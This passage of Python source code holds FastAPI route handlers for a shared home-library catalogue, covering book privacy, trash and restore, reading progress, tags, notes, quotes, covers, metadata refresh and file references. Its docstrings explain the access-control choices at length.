@router.patch("/{book_id}/collection", response_model=BookOut)
def set_collection(
    payload: CollectionAssign,
    book: BookForWrite,
    db: DbSession,
    current_user: CurrentUser,
) -> BookOut:
    """File this book into a collection, or take it out of one.

    `BookForWrite`, not `BookForOwner`. A collection is shelving, and a public
    book is a shared shelf that any member may curate, exactly like its tags
    and its location. Privacy is the one thing reserved to the owner, and this
    is deliberately not that: filing a book changes nothing about who can see
    it.

    **Per book row, so per copy.** Filing one paperback does not file the
    other, which is the point of two rows: see `models.Book.collection_id`.
    """
    book.collection_id = _checked_collection(db, payload.collection_id, current_user.id)
    db.commit()
    db.refresh(book)
    return book_to_out(book, current_user, db)


@router.patch("/{book_id}/privacy", response_model=BookOut)
def set_privacy(
    payload: PrivacyUpdate,
    book: BookForOwner,
    db: DbSession,
    current_user: CurrentUser,
) -> BookOut:
    book.is_private = payload.is_private
    db.commit()
    db.refresh(book)
    return book_to_out(book, current_user, db)


@router.delete("/{book_id}", status_code=status.HTTP_204_NO_CONTENT)
def delete_book(book: BookForWrite, db: DbSession) -> None:
    """Move a book to the trash. Reversible with `POST /{id}/restore`.

    The row stays and `deleted_at` is stamped. A delete is one tap away from
    every book, it is the only action here that repeating does not undo, and a
    catalogue is somebody's hours of typing. Reviews of the competition make
    the same complaint about all of them: the app does not say what was
    deleted and offers no way to put it back.

    The status code is unchanged at 204, so nothing calling this has to know.
    """
    _trash(book, db)
    db.commit()


@router.post("/{book_id}/restore", response_model=BookOut)
def restore_book(book: BookInTrash, db: DbSession, current_user: CurrentUser) -> BookOut:
    """Put a trashed book back on the shelf.

    Everything comes back with it: tags, notes, quotes, loans and every
    member's reading status, because none of it ever left. That is the
    difference between this and re-adding the book by hand, and it is the whole
    point.
    """
    book.deleted_at = None
    db.commit()
    db.refresh(book)
    return book_to_out(book, current_user, db)


@router.delete("/{book_id}/permanent", status_code=status.HTTP_204_NO_CONTENT)
def purge_book(book: BookInTrash, db: DbSession) -> None:
    """Delete one trashed book for good."""
    purged = _purge(book, db)
    db.commit()
    # After the commit. See `_purge`.
    cover_store.remove(purged)


@router.put("/{book_id}/status", response_model=BookOut)
def update_status(
    payload: BookStatusUpdate,
    book: BookForRead,
    db: DbSession,
    current_user: CurrentUser,
) -> BookOut:
    """Set the caller's own reading status. Read access is enough: a status is
    personal to the member setting it and changes nothing for anyone else."""
    Reading.by(db, current_user.id).mark(book.id, payload.status)
    db.commit()
    return book_to_out(book, current_user, db)


# ── Reading progress ──────────────────────────────────────────────────────────
#
# Declared here, beside the status endpoint they cooperate with, rather than up
# with `/export` and `/search`. The route-order gotcha does not reach these:
# it is about a **literal** first segment losing to `/{book_id}`, and
# `/{book_id}/progress` shares no shape with `/{book_id}` to lose to. See
# `docs/decisions.md`.
#
# All three take `BookForRead`. Progress is personal and changes nothing for
# anybody else, exactly like status and rating, so read access is the right
# gate. Every query filters on `user_id` **as well**: the book being visible
# says nothing about whose reading of it the caller may see.


@router.get("/{book_id}/progress", response_model=list[ProgressOut])
def list_progress(
    book: BookForRead,
    db: DbSession,
    current_user: CurrentUser,
) -> list[ReadingProgress]:
    """The caller's own recorded positions, newest first.

    Never anybody else's, even on a public book. Two members reading the same
    copy is the ordinary case here, and the log is a diary rather than a shelf
    fact.
    """
    return (
        db.query(ReadingProgress)
        .filter(
            ReadingProgress.book_id == book.id,
            ReadingProgress.user_id == current_user.id,
        )
        .order_by(ReadingProgress.recorded_at.desc(), ReadingProgress.id.desc())
        .all()
    )


@router.post(
    "/{book_id}/progress",
    response_model=ProgressOut,
    status_code=status.HTTP_201_CREATED,
)
def add_progress(
    payload: ProgressCreate,
    book: BookForRead,
    db: DbSession,
    current_user: CurrentUser,
) -> ReadingProgress:
    """Record where the caller has got to.

    Saying where you are in a book is the same claim the READING button makes,
    arrived at from the other direction, so it promotes an unstarted book
    rather than leaving a member with a page number and a status of "unread".
    The promotion itself goes through `Reading.begin`, which owns that rule
    and the date stamping under it; duplicating them here is how the two would
    drift.

    **It never sets READ, whatever the page number.** `page_count` comes from a
    metadata provider and is off by one often enough that the last page is not
    a reliable finish signal, and finishing already has an explicit control.
    """
    entry = ReadingProgress(
        user_id=current_user.id,
        book_id=book.id,
        page=payload.page,
        percent=payload.percent,
        minutes=payload.minutes,
    )
    db.add(entry)

    # The promotion rules, the unflushed-status trap and the reason
    # DID_NOT_FINISH promotes where READ does not all live on `Reading.begin`.
    Reading.by(db, current_user.id).begin(book.id)

    db.commit()
    db.refresh(entry)
    return entry


@router.delete("/{book_id}/progress/{progress_id}", status_code=status.HTTP_204_NO_CONTENT)
def delete_progress(
    progress_id: RowId,
    book: BookForRead,
    db: DbSession,
    current_user: CurrentUser,
) -> None:
    """Remove one of the caller's own entries. A mistyped page is the case.

    404 for somebody else's row and for one belonging to a different book, not
    403, for the same reason an invisible book is: a 403 would confirm the id
    exists. The book/entry pairing is enforced so an id from another book
    cannot be deleted through a book the caller happens to have access to,
    which is the rule `_note_for_edit` states for notes.

    The status is left alone. Deleting the only entry does not put the book
    back to unread: somebody pressed READING, or this endpoint did on their
    behalf, and removing a mistyped page number is not a claim about that.
    """
    entry = (
        db.query(ReadingProgress)
        .filter(
            ReadingProgress.id == progress_id,
            ReadingProgress.book_id == book.id,
            ReadingProgress.user_id == current_user.id,
        )
        .first()
    )
    if entry is None:
        raise HTTPException(status_code=404, detail="Progress entry not found")
    db.delete(entry)
    db.commit()


# ── Tagging ───────────────────────────────────────────────────────────────────


@router.post("/{book_id}/tags", response_model=BookOut)
def add_book_tag_by_name(
    payload: TagCreate,
    book: BookForWrite,
    db: DbSession,
    current_user: CurrentUser,
) -> BookOut:
    """Put a tag with this name on this book, inventing it if it is new.

    One request where typing a name used to be two, and the two were a
    different question each: inventing a tag hands back an id, and attaching
    that id is asked of somebody who might have guessed it. Typing a name is
    neither. Somebody typing a tag name while looking at a book means "this
    book is that", so this is the one gesture and the one answer.

    **The book as it stands, always, and never a 409, a 201 or a 404 for the
    name.** A status that told a minted name from a matched one would answer
    "does this name already exist" in the status line, which is the question
    a member may not have answered about a tag they cannot see. A name that
    is not this member's to use is left off the book, in the same shape as a
    name that is: `tags.Naming` decides it and carries what that does and does
    not close.

    Refused only for what the caller can already see: a name that is not a
    name, by `TagCreate`, and a book already carrying
    `MAX_TAGS_PER_BOOK` tags, with the sentence and the reasoning of the
    attach by id route beside this one.
    """
    # **No `Vocabulary` call in this handler, and the absence is the design.**
    # The gate on the route below is about an id the caller may have guessed;
    # here the caller supplied a name they typed, which is a different
    # question with a different answer, and asking both would be the two
    # cooperating rules `tags.Naming` exists to be instead of.
    #
    # **And no query for a Tag here either.** A hand rolled lookup would be a
    # read of the tag table with no viewer, needing its own entry in
    # `tests/test_tags.py::TAG_READERS` and its own reason; going through the
    # Naming reads through the Mint's index, which is already classified.
    #
    # **The ceiling refusal below is conditional on the name resolving, and
    # that is a residue rather than something to close here.** A member who
    # fills their own book to the ceiling first reads a 400 for a name they
    # may use against a 200 for one they may not. It is the answer
    # `create_tag` already gives in one request with no setup, so it opens no
    # channel; asking `room_on` before resolving would instead refuse a name
    # the book already carries, which is a false refusal on a request that
    # changes nothing.
    tag = Naming.for_member(db, current_user.id).tag(payload.name)
    if tag is not None and tag not in book.tags:
        if not attach(book, tag):
            raise HTTPException(
                status_code=400,
                detail=f"A book can carry {MAX_TAGS_PER_BOOK} tags, and this one already does.",
            )
        db.commit()
        db.refresh(book)
    return book_to_out(book, current_user, db)


@router.post("/{book_id}/tags/{tag_id}", response_model=BookOut)
def add_book_tag(
    tag_id: RowId,
    book: BookForWrite,
    db: DbSession,
    current_user: CurrentUser,
) -> BookOut:
    tag = db.get(Tag, tag_id)
    # **The name confirmation this route used to be.** `book_to_out` returns
    # the Book with its tags, so attaching a guessed id to a Book you own
    # handed back the name of a Tag whose every Book was hidden from you: a
    # stronger channel than the list ever was, because it answers for a chosen
    # id rather than dumping the table. `tags.Vocabulary.writable` collapses
    # that into the 404 an unused id already gets.
    if tag is None or not Vocabulary.seen_by(db, current_user.id).writable(tag):
        raise HTTPException(status_code=404, detail="Tag not found")
    if tag not in book.tags:
        # **Refused rather than dropped, which is where this differs from the
        # import.** A member pressed one button for one tag, so a 200 with the
        # tag missing is the picker lying to them; an import is a file of
        # thousands and its ceiling is reached quietly by design. `tags.attach`
        # is what makes the ceiling true of every writer: this route is how the
        # 4000 tags on one Book that the import cap exists to prevent stayed
        # reachable, one request at a time.
        if not attach(book, tag):
            raise HTTPException(
                status_code=400,
                detail=f"A book can carry {MAX_TAGS_PER_BOOK} tags, and this one already does.",
            )
        db.commit()
        db.refresh(book)
    return book_to_out(book, current_user, db)


@router.delete("/{book_id}/tags/{tag_id}", response_model=BookOut)
def remove_book_tag(
    tag_id: RowId,
    book: BookForWrite,
    db: DbSession,
    current_user: CurrentUser,
) -> BookOut:
    tag = db.get(Tag, tag_id)
    # **Not gated by `tags.Vocabulary`, and that is the measurement rather than
    # an oversight.** This answers 200 with the unchanged Book for an id no row
    # carries and for an id the caller may not be told about alike, so it
    # confirms nothing today. Refusing the second with a 404 would *create* the
    # tell: a 404 here would mean "that id is a Tag you cannot see" against the
    # 200 everything else gets. The bulk verb is gated because its own refusal
    # already existed and the gate collapses two answers into one.
    if tag is not None and tag in book.tags:
        book.tags.remove(tag)
        db.commit()
        db.refresh(book)
    return book_to_out(book, current_user, db)


# ── Custom field values, per book ─────────────────────────────────────────────
#
# **The privacy rule for these is `BookForRead` and `BookForWrite`**, which is
# the app's ordinary book access control and not a second copy of it. A value
# hangs off a book, so who may read it is decided by who may read that book, and
# both handlers below receive a `Book` the dependency has already resolved
# through the Shelf. `custom_fields.values_on` takes a `Book` rather than an id
# precisely so that this is the only way to reach one.
#
# Served here rather than on `BookOut`, like notes and quotes and unlike tags.
# Two reasons and the second is the load bearing one. A page of 25 book cards
# has no room to render them, so putting them on every listing payload would buy
# nothing; and `books_to_out` is a fixed statement budget that a test reads out
# of its own docstring, so a field nobody displays would cost every listing in
# the app one more query. The figure is deliberately not repeated here: it lived
# in this comment while a third copy elsewhere in this file disagreed with it,
# and nothing recounts a number in a comment.


def _custom_fields_out(book: Book, db: Session) -> list[CustomFieldValueOut]:
    """This book's filled-in fields, links resolved.

    `href` is computed here on every read rather than stored, so a value that
    reached the table without passing the write check is served as text. See
    `custom_fields.link_target`.
    """
    return [
        CustomFieldValueOut(
            field_id=filled.field.id,
            name=filled.field.name,
            kind=filled.kind,
            value=filled.value,
            href=filled.href,
        )
        for filled in custom_fields.values_on(db, book)
    ]


@router.get("/{book_id}/custom-fields", response_model=list[CustomFieldValueOut])
def get_custom_fields(book: BookForRead, db: DbSession) -> list[CustomFieldValueOut]:
    """What this book holds in the library's own fields.

    Only the fields it has something in: a book with no value for a field is
    absent from this list rather than present and empty, because clearing a
    value deletes the row. Ask `GET /api/books/custom-fields` for the ones that
    could be filled in.
    """
    return _custom_fields_out(book, db)


@router.put("/{book_id}/custom-fields/{field_id}", response_model=list[CustomFieldValueOut])
def set_custom_field(
    field_id: RowId,
    payload: CustomFieldValueUpdate,
    book: BookForWrite,
    db: DbSession,
    current_user: CurrentUser,
) -> list[CustomFieldValueOut]:
    """Fill in a field on this book, or clear it with an empty value.

    One verb for both, because emptying the box and saving is what a person
    does and a client should not have to decide which of two verbs that means.

    Returns the book's whole list rather than the one value, so a client that
    has just written one is holding the same thing `GET` would give it.

    **404 for a field you may not be told about**, and this is the door that
    makes the scoped list worth having: the response carries `name` on every
    entry, so an ungated write would be a name oracle over a small integer id
    space, reachable on a book of your own. See `fields.Fields.addressable`.

    400 when the field holds a link and the value is not one: an address with
    no scheme, a `javascript:` or `data:` URL, or a host that is missing. See
    `custom_fields.link_target` for the whole list and why it is re-checked on
    every read as well as here.
    """
    field = _custom_field(field_id, db, Fields.seen_by(db, current_user.id))
    try:
        custom_fields.write(db, book, field, payload.value)
    except custom_fields.Refused as refusal:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST, detail=str(refusal)
        ) from refusal
    db.commit()
    return _custom_fields_out(book, db)


# ── Cover upload ──────────────────────────────────────────────────────────────


@router.post("/{book_id}/cover", response_model=BookOut)
async def upload_cover(
    book: BookForWrite,
    db: DbSession,
    current_user: CurrentUser,
    file: Annotated[UploadFile, File()],
) -> BookOut:
    # Read against the size cap and refused here if it is not an image, so the
    # caller gets a 413 or a 400 rather than a 500 out of the store's own
    # refusal. What the file is called, and that the other formats of this book
    # go with it, are `cover_store`'s.
    data = await read_image_upload(file)
    destination = cover_store.save(book.id, data)
    book.cover_url = covers.local_url(book.id, destination.suffix.lstrip("."))
    db.commit()
    db.refresh(book)
    return book_to_out(book, current_user, db)


# ── Metadata refresh ──────────────────────────────────────────────────────────


@router.put("/{book_id}/refresh", response_model=BookOut)
async def refresh_metadata(book: BookForWrite, db: DbSession, current_user: CurrentUser) -> BookOut:
    if not book.isbn:
        raise HTTPException(status_code=400, detail="Book has no ISBN, cannot refresh metadata")

    # Below the refusal above, so a book with no ISBN costs no budget. The
    # constructor is what charges, which is why it is a statement here rather
    # than a dependency: a dependency runs before this handler's own 400.
    enquiry = catalogue_access.Enquiry.for_a_member_request(
        db, member=current_user.username
    )
    lookup_key = isbn_utils.parse(book.isbn) or book.isbn
    result = await enquiry.lookup(lookup_key)
    if not result.found:
        raise _lookup_failure(result)

    assert result.record is not None  # noqa: S101  narrowing, not validation
    record = result.record

    # Nine columns written straight off the record, and the ceiling on all of
    # them is `catalogue.Record.__post_init__`, which clears a scalar the column
    # cannot hold before the record ever leaves `metadata.lookup`. Bounding it
    # here instead would be a fourth door: this handler, `as_lookup`,
    # `_match_rows` and `_bounded_match` all write from the same record, and
    # three of them had a bound while this one had none.
    #
    # So a value too wide arrives as `None`, and the three rules below read it
    # the way they already read a catalogue that carries no such field:
    # `title`, `language` and `page_count` keep what the Book had; `subtitle`,
    # `author`, `publisher`, `year` and `description` are cleared, which is what
    # a refresh does with anything the source no longer asserts; and `cover_url`
    # is cleared only where the Book is not carrying a locally uploaded cover.
    #
    # **A dropped `author` also costs this record's authority assertions**, and
    # that is worth knowing because nothing reports it. The write at the bottom
    # of this handler passes `credited=book.author`, and
    # `record_catalogue_assertions` keeps only the names in that credit line, so
    # an absent one keeps none. It takes the "not credited on this book" arm,
    # which logs and deliberately leaves `refused` empty, so the response says
    # nothing either. The alternative is worse: writing a person into the
    # authority store off a credit line this Library never saw.
    book.title = record.title or book.title
    book.subtitle = record.subtitle
    book.author = record.author
    book.publisher = record.publisher
    book.year = record.year
    book.description = record.description

    # Only ever filled in, never cleared: a refresh whose source lacks the page
    # count should not delete the one already on the record.
    book.language = record.language or book.language
    book.page_count = record.page_count or book.page_count

    # A cover the member uploaded outranks whatever the source offers.
    if not covers.is_local(book.cover_url):
        book.cover_url = record.cover_url
        # `to_thread` rather than a direct call: this handler is a coroutine, and
        # `resolve_and_store` runs its own event loop.
        await asyncio.to_thread(_store_cover, book)

    # A refresh selects no Catalogue record. Its Classifications remain
    # external evidence until a Member selects a candidate through enrich/apply.
    #
    # **The author's authority identifier is written here, and that is not the
    # same rule.** A Classification is a fact about *this Book* and ADR 0006
    # says one reaches a Book only when a Member confirms the whole record. An
    # authority identifier is a fact about a *name*: it says which record in an
    # external file the person credited here is, it is filed under the spelling
    # rather than under the book, and nothing about the Book changes. What makes
    # it certain is the same thing that makes this handler willing to overwrite
    # the title: the record was found by this Book's own verified ISBN.
    # **Below the handler's own commit, deliberately.**
    # `record_catalogue_assertions` commits internally, which `enrich_book`
    # depends on and which must not be removed. Called above this line it
    # decided the boundary for eight fields pending on the same session, so
    # anything that ever sits between the two would leave a half refreshed Book
    # committed. The identifier write is independent of the Book row, so it
    # belongs after it.
    db.commit()
    recorded = Authorship.seen_by(db, current_user.id).record_catalogue_assertions(
        record.author_identifiers, credited=book.author
    )
    db.refresh(book)
    return _with_refusals(book_to_out(book, current_user, db), recorded)


# ── Notes ─────────────────────────────────────────────────────────────────────


@router.get("/{book_id}/notes", response_model=list[NoteOut])
def get_notes(book: BookForRead, db: DbSession, current_user: CurrentUser) -> list[Note]:
    """The notes on this book that the caller may read: the shared ones, and
    their own private ones.

    Two predicates, and neither is redundant. `BookForRead` answers 404 for a
    book the caller may not see, without which the notes on a private book were
    readable by anyone who guessed its id. `note_visible_to` then decides which
    notes on a book they can see; `models.Note` says why authorship is not that
    answer.
    """
    return (
        db.query(Note)
        .options(joinedload(Note.author))
        .filter(Note.book_id == book.id, note_visible_to(current_user.id))
        .order_by(Note.created_at, Note.id)
        .all()
    )


@router.post("/{book_id}/notes", response_model=NoteOut, status_code=status.HTTP_201_CREATED)
def add_note(
    payload: NoteCreate,
    book: BookForRead,
    db: DbSession,
    current_user: CurrentUser,
) -> Note | None:
    note = Note(book_id=book.id, user_id=current_user.id, content=payload.content)
    db.add(note)
    db.commit()
    db.refresh(note)
    return _note_for_reading_back(note.id, current_user, db)


def _note_for_reading_back(note_id: int, current_user: User, db: Session) -> Note | None:
    """The note just written, reloaded with its author for the response.

    Narrowed by `note_visible_to` even though the caller wrote the row a
    statement ago, so that **every** function here returning a `Note` carries
    the predicate and none of them relies on an argument about why it need not.
    `TestANoteReadIsNarrowedToItsReader` is the guard, and an unnarrowed
    re-read is what it would report.
    """
    return (
        db.query(Note)
        .options(joinedload(Note.author))
        .filter(Note.id == note_id, note_visible_to(current_user.id))
        .first()
    )


def _note_for_edit(note_id: int, book: Book, current_user: User, db: Session) -> Note:
    """A note belonging to this book, which the caller may change.

    The book/note pairing is enforced so a note id from another book cannot be
    edited through a book the caller happens to have access to.

    **404 for a note the caller cannot read, 403 for one they can.** A 403 on a
    private note would confirm that another member's private note exists, which
    is what the privacy withholds; `dependencies._not_found` states the same
    rule for a book. A shared note somebody else wrote is a 403 because its
    existence is not a secret, only its authorship is.

    **The admin arm stops at the visibility.** An admin may edit or delete any
    note they can read, which is the moderation power `docs/data-model.md`
    records. It does not reach a private note: nobody else reads one, so there
    is nothing to moderate, and reaching it would make this the one route where
    admin bypasses a visibility predicate.
    """
    note = (
        db.query(Note)
        .filter(Note.id == note_id, Note.book_id == book.id, note_visible_to(current_user.id))
        .first()
    )
    if note is None:
        raise HTTPException(status_code=404, detail="Note not found")
    if note.user_id != current_user.id and not current_user.is_admin:
        raise HTTPException(status_code=403, detail="Not allowed to change this note")
    return note


@router.put("/{book_id}/notes/{note_id}", response_model=NoteOut)
def edit_note(
    note_id: RowId,
    payload: NoteCreate,
    book: BookForRead,
    db: DbSession,
    current_user: CurrentUser,
) -> Note | None:
    note = _note_for_edit(note_id, book, current_user, db)
    note.content = payload.content
    db.commit()
    return _note_for_reading_back(note.id, current_user, db)


@router.delete("/{book_id}/notes/{note_id}", status_code=status.HTTP_204_NO_CONTENT)
def delete_note(
    note_id: RowId,
    book: BookForRead,
    db: DbSession,
    current_user: CurrentUser,
) -> None:
    db.delete(_note_for_edit(note_id, book, current_user, db))
    db.commit()


# ── Quotes ────────────────────────────────────────────────────────────────────
#
# A quote is visible to whoever can see the book it came from, and deliberately
# so: the shelf is shared, and a passage one member copied out of a book the
# library holds is the library's to read. It is not treated like
# `list_progress`, which returns only the caller's own rows, because a reading
# log is a diary about a person and a quote is about the book.
#
# **This is no longer the same rule as notes**, which now carry `is_private`.
# The line between them is what the row holds: a note is the member's own words
# and a quote is a transcription of the book's. `docs/decisions.md` records both.


def _quotes_for(book: Book, db: Session) -> list[Quote]:
    """One book's quotes, in reading order.

    Ordered by page rather than by when they were typed, which is where notes
    and quotes part company: notes are a conversation and read in the order
    they were said, quotes are a book read front to back. `nullslast` keeps the
    unpaged ones together at the end instead of wherever SQLite puts NULL.
    """
    return (
        db.query(Quote)
        .options(joinedload(Quote.author))
        .filter(Quote.book_id == book.id)
        .order_by(nullslast(Quote.page.asc()), Quote.created_at, Quote.id)
        .all()
    )


@router.get("/{book_id}/quotes", response_model=list[QuoteOut])
def get_quotes(book: BookForRead, db: DbSession) -> list[Quote]:
    """Requires read access to the book, and nothing else.

    `BookForRead` is the whole privacy check here: it answers 404 for a book
    the caller may not see, so there is no path to the quotes on one. A quote
    carries no per-row visibility of its own, unlike a note, so there is no
    second predicate to apply.
    """
    return _quotes_for(book, db)


@router.post("/{book_id}/quotes", response_model=QuoteOut, status_code=status.HTTP_201_CREATED)
def add_quote(
    payload: QuoteCreate,
    book: BookForRead,
    db: DbSession,
    current_user: CurrentUser,
) -> Quote | None:
    quote = Quote(
        book_id=book.id,
        user_id=current_user.id,
        text=payload.text,
        page=payload.page,
        note=payload.note,
    )
    db.add(quote)
    db.commit()
    db.refresh(quote)
    return db.query(Quote).options(joinedload(Quote.author)).filter(Quote.id == quote.id).first()


def _quote_for_edit(quote_id: int, book: Book, current_user: User, db: Session) -> Quote:
    """A quote belonging to this book, which the caller may change.

    The book/quote pairing is enforced so a quote id from another book cannot
    be edited through a book the caller happens to have access to. Same rule,
    same reason, as `_note_for_edit`.
    """
    quote = db.query(Quote).filter(Quote.id == quote_id, Quote.book_id == book.id).first()
    if quote is None:
        raise HTTPException(status_code=404, detail="Quote not found")
    if quote.user_id != current_user.id and not current_user.is_admin:
        raise HTTPException(status_code=403, detail="Not allowed to change this quote")
    return quote


@router.put("/{book_id}/quotes/{quote_id}", response_model=QuoteOut)
def edit_quote(
    quote_id: RowId,
    payload: QuoteCreate,
    book: BookForRead,
    db: DbSession,
    current_user: CurrentUser,
) -> Quote | None:
    quote = _quote_for_edit(quote_id, book, current_user, db)
    quote.text = payload.text
    quote.page = payload.page
    quote.note = payload.note
    db.commit()
    return db.query(Quote).options(joinedload(Quote.author)).filter(Quote.id == quote.id).first()


@router.delete("/{book_id}/quotes/{quote_id}", status_code=status.HTTP_204_NO_CONTENT)
def delete_quote(
    quote_id: RowId,
    book: BookForRead,
    db: DbSession,
    current_user: CurrentUser,
) -> None:
    db.delete(_quote_for_edit(quote_id, book, current_user, db))
    db.commit()


# ── Digital references ────────────────────────────────────────────────────────
#
# Where a Member says one of their book files is. **No bytes reach this server
# on any route below**: the client parses the file and sends metadata, so
# nothing here has been read, opened or checked, and every value stored is a
# claim by whoever holds a session. `models.DigitalReference` carries the rest,
# including why `confirmed_at` is not "last seen".
#
# **Every route in this section is per book and goes through `dependencies`**,
# so the privacy rule reaches a reference exactly as it reaches any other field
# on a book: a reference on a book the caller cannot see is a 404 on the book,
# never a row. The reads below are reported by `tests/test_shelf.py`'s fourth
# pass, because `digital_references` is book owned, and each carries its reason
# in `BOOK_OWNED_READERS`.
#
# **The fifth route is not here and not per book**: `GET /digital-references/
# missing` reads the flag across the shelf and is declared before `/{book_id}`,
# which is why it sits with `/quotes` rather than with its own family. It is
# scoped by the Shelf and by nothing else, which is this table's rule and not a
# looser reading of it: a reference has no Member of its own.


def _digital_reference_for(book: Book, reference_id: int, db: Session) -> DigitalReference:
    """One reference belonging to **this** book, or 404.

    The book/reference pairing is enforced rather than assumed, for the reason
    `_note_for_edit` enforces it: an id from another book must not be reachable
    through a book the caller does happen to hold. There is no second
    permission question after that, because a reference carries no Member of
    its own: whoever may write the book may write its references, which is the
    same rule `BookForWrite` states for tags and covers.
    """
    reference = (
        db.query(DigitalReference)
        .filter(
            DigitalReference.id == reference_id,
            DigitalReference.book_id == book.id,
        )
        .first()
    )
    if reference is None:
        raise HTTPException(status_code=404, detail="Digital reference not found")
    return reference


@router.get("/{book_id}/digital-references", response_model=list[DigitalReferenceOut])
def list_digital_references(book: BookForRead, db: DbSession) -> list[DigitalReference]:
    """Where this book's files have been reported to be.

    **Served here rather than on `BookOut`**, like notes and quotes and unlike
    tags. A listing of 25 books would otherwise selectin-load this relationship
    onto every row to render something no listing shows, which is the N+1
    `_books_to_out` exists to avoid.

    Nothing in the response has been verified by this server. `confirmed_at` is
    when it was last **told** the file was there.
    """
    return (
        db.query(DigitalReference)
        .filter(DigitalReference.book_id == book.id)
        .order_by(DigitalReference.id)
        .all()
    )


@router.post("/{book_id}/digital-references", response_model=DigitalReferenceOut)
def report_digital_reference(
    payload: DigitalReferenceIn,
    book: BookForWrite,
    db: DbSession,
) -> DigitalReference:
    """A client reporting that it found this book's file at this location.

    **Idempotent on the location, and that is the design rather than a
    convenience.** A reference is identified by where the file is, so the same
    report twice is one reference: re-importing a folder somebody imported last
    month refreshes those rows instead of doubling them, which at the scale this
    runs at (a directory pick is hundreds of files in one gesture) is the
    difference between a feature and a mess.

    **200 rather than 201** for the same reason: the route is not a create. What
    happened to a given location is answerable by reading the list back, and a
    status that varied would be one more thing for a client committing 300
    files to branch on.

    **The report replaces the fingerprint whole rather than filling in the gaps
    in it.** A row says what one client saw in one look. Merging a new size with
    an old modification time would produce a fingerprint that no client ever
    reported and that no re-check could ever match.

    **A sighting clears `missing_since`.** Something has now looked and found
    it, which is the only evidence that ever contradicts a miss.

    The per book ceiling is counted here rather than trusted to the payload,
    which bounds one request and not the total: see
    `MAX_DIGITAL_REFERENCES_PER_BOOK`. It binds a **new** location only, so a
    book already at the ceiling can still re-confirm what it holds.
    """
    existing = (
        db.query(DigitalReference)
        .filter(
            DigitalReference.book_id == book.id,
            DigitalReference.root_label == payload.root_label,
            DigitalReference.relative_path == payload.relative_path,
        )
        .first()
    )
    if existing is None:
        # Narrowed to this book, and that narrowing **is** the ceiling: without
        # it the count is the whole library's and one member filling their own
        # shelf refuses everybody else's next reference.
        held = (
            db.query(func.count(DigitalReference.id))
            .filter(DigitalReference.book_id == book.id)
            .scalar()
        )
        if held >= MAX_DIGITAL_REFERENCES_PER_BOOK:
            raise HTTPException(
                status_code=status.HTTP_409_CONFLICT,
                detail=(
                    "This book already holds "
                    f"{MAX_DIGITAL_REFERENCES_PER_BOOK} file references"
                ),
            )
        existing = DigitalReference(
            book_id=book.id,
            root_label=payload.root_label,
            relative_path=payload.relative_path,
        )
        db.add(existing)

    existing.root_confirmed = payload.root_confirmed
    existing.size_bytes = payload.size_bytes
    existing.file_modified_at = payload.file_modified_at
    # The database's clock, not the client's, and not the client's word for when
    # it looked. This column records when this server was told.
    existing.confirmed_at = func.now()
    existing.missing_since = None

    db.commit()
    db.refresh(existing)
    return existing


@router.post(
    "/{book_id}/digital-references/{reference_id}/missing",
    response_model=DigitalReferenceOut,
)
def report_digital_reference_missing(
    reference_id: RowId,
    book: BookForWrite,
    db: DbSession,
) -> DigitalReference:
    """A client reporting that it looked and the file was not there.

    **The row is flagged and never deleted**, and that refusal is the whole
    route. A phone that cannot reach the NAS reports every file on the NAS
    missing and is telling the truth about what it can see; acting on it would
    let one browser with a drive unplugged erase the household's record of where
    its library is. The flag is for a person to read.

    **The timestamp does not move on a second report**, because the column
    records when this was *first* said. A client re-checking hourly would
    otherwise keep resetting the age of the problem to nothing.

    Reversed by an ordinary sighting: something looked and found it.
    """
    reference = _digital_reference_for(book, reference_id, db)
    if reference.missing_since is None:
        reference.missing_since = func.now()
        db.commit()
        db.refresh(reference)
    return reference


@router.delete(
    "/{book_id}/digital-references/{reference_id}",
    status_code=status.HTTP_204_NO_CONTENT,
)
def forget_digital_reference(
    reference_id: RowId,
    book: BookForWrite,
    db: DbSession,
) -> None:
    """Forget a reference, because a Member said to.

    The one way a row leaves this table short of the book being purged. It is
    deliberately not what a missing report does: a person deciding the file is
    gone and a browser that could not see it are different statements, and only
    the first is evidence.
    """
    db.delete(_digital_reference_for(book, reference_id, db))
    db.commit()


# ── Store identifiers ─────────────────────────────────────────────────────────


def _book_identifier_for(book: Book, identifier_id: int, db: Session) -> BookIdentifier:
    """One identifier belonging to **this** book, or 404.

    `_digital_reference_for`'s rule, for the table that shares its ownership
    model: the book/row pairing is enforced in the query rather than taken from
    the path, so an id from another book is not reachable through a book the
    caller does happen to hold. There is no second permission question after
    that, because an identifier carries no Member of its own.
    """
    identifier = (
        db.query(BookIdentifier)
        .filter(
            BookIdentifier.id == identifier_id,
            BookIdentifier.book_id == book.id,
        )
        .first()
    )
    if identifier is None:
        raise HTTPException(status_code=404, detail="Identifier not found")
    return identifier


@router.delete(
    "/{book_id}/identifiers/{identifier_id}",
    status_code=status.HTTP_204_NO_CONTENT,
)
def forget_book_identifier(
    identifier_id: RowId,
    book: BookForWrite,
    db: DbSession,
) -> None:
    """Remove a wrong identifier. Importing again does not put it back.

    **The only correction there is**, and it is deliberately destructive rather
    than an edit. `models.BookIdentifier` carries the reasoning and
    `forget_author_identifier` is where this app first made the trade: a store
    or a reader can be wrong, a fact that cannot be corrected is a trap rather
    than an invariant, and what stays refused is retyping a row to a different
    value, because that is the operation that turns a guess into something
    reading as a catalogue's assertion.

    **Unlike the author route, nothing re-asserts this one**, and the summary
    line says exactly that much because a client generates its own prose from
    it. An author's identifier is written again by the next catalogue record
    the server fetches. `add_identifiers` is reached only from `_create_book`,
    which both adding routes share and which always builds a new Book, so what
    re-importing the store file could offer is a Book rather than the row.

    **Whether it offers one at all is conditional, and `models.BookIdentifier`
    is where the condition lives.** Not restated here: a second copy of the
    condition is a second thing to keep true.

    **Whoever may write the book**, which is the rule for its tags, its cover
    and its digital references and is not a softer one here: the row carries no
    Member of its own, so its permission is the book's entirely. A book the
    caller cannot see is **404**, identical to one that is not there, and so is
    an identifier belonging to a different book.
    """
    db.delete(_book_identifier_for(book, identifier_id, db))
    db.commit()


# ── Enrichment ────────────────────────────────────────────────────────────────



@router.post("/{book_id}/enrich", response_model=BookEnrichmentOut)
async def enrich_book(
    book: BookForWrite,
    db: DbSession,
    current_user: CurrentUser,
    overwrite: Annotated[bool, Query(description="Replace fields that already have a value")] = False,
) -> BookEnrichmentOut:
    """Fill in the fields a book is missing, from every catalogue available.

    Matched by ISBN when there is one, which runs the full merged chain; then by
    the book's own Google Books volume id, where it carries one and the library
    asks Google Books; and by title and author otherwise, which runs the ranked
